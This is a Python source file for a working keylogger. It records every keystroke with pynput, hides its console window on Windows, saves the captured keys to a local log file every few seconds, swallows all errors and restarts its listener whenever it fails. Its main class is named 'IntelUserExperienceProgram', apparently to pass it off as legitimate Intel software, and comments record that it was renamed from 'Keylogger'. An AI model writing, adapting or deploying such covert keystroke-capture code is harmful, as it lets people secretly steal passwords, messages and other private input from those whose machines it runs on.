from pynput import keyboard
import threading
from datetime import datetime
import os
import sys
import time

class IntelUserExperienceProgram:
    def __init__(self, filename="keylog.txt", save_interval=10):
        self.filename = filename
        self.save_interval = save_interval
        self.keystrokes = []
        self.is_running = True
        
        # Create log directory if it doesn't exist
        self.log_dir = "logs"
        if not os.path.exists(self.log_dir):
            os.makedirs(self.log_dir)
        
        self.full_path = os.path.join(self.log_dir, filename)
        
        # Hide console window (Windows only)
        if sys.platform == "win32":
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    
    def save_log(self):
        """Save keystrokes to file"""
        if self.keystrokes:
            try:
                with open(self.full_path, "a", encoding="utf-8") as f:
                    # Add header with timestamp
                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    f.write(f"\n{'='*50}\n")
                    f.write(f"Log Entry: {timestamp}\n")
                    f.write(f"{'='*50}\n\n")
                    
                    # Write keystrokes
                    for key in self.keystrokes:
                        f.write(key)
                    
                    f.write("\n")
                
                self.keystrokes = []  # Clear buffer
                
            except Exception as e:
                # Silently continue even if save fails
                pass
        
        # Schedule next save if still running
        if self.is_running:
            timer = threading.Timer(self.save_interval, self.save_log)
            timer.daemon = True
            timer.start()
    
    def on_press(self, key):
        """Handle key press events"""
        try:
            # Common keys
            if key == keyboard.Key.enter:
                self.keystrokes.append('\n')
            elif key == keyboard.Key.space:
                self.keystrokes.append(' ')
            elif key == keyboard.Key.tab:
                self.keystrokes.append('[TAB]')
            elif key == keyboard.Key.backspace:
                self.keystrokes.append('[BACKSPACE]')
            elif key == keyboard.Key.esc:
                self.keystrokes.append('[ESC]')  # ESC is just logged, not used to exit
            elif hasattr(key, 'char'):
                if key.char:
                    self.keystrokes.append(key.char)
            else:
                # Log other keys
                key_str = str(key).replace("'", "").replace("Key.", "")
                if key_str and len(key_str) < 20:  # Avoid long garbage strings
                    self.keystrokes.append(f'[{key_str}]')
                    
        except:
            pass  # Ignore all errors
    
    def start(self):
        """Start the keylogger - runs forever"""
        # Start auto-save timer
        self.save_log()
        
        # Keep trying to start listener even if it crashes
        while self.is_running:
            try:
                with keyboard.Listener(on_press=self.on_press) as listener:
                    listener.join()
            except:
                # If listener crashes, restart after delay
                time.sleep(2)
                continue

# Main execution - CORRECTED: Use the right class name
if __name__ == "__main__":
    # Run silently - FIXED: Use IntelUserExperienceProgram instead of Keylogger
    program = IntelUserExperienceProgram(filename="oops.txt", save_interval=15)
    program.start()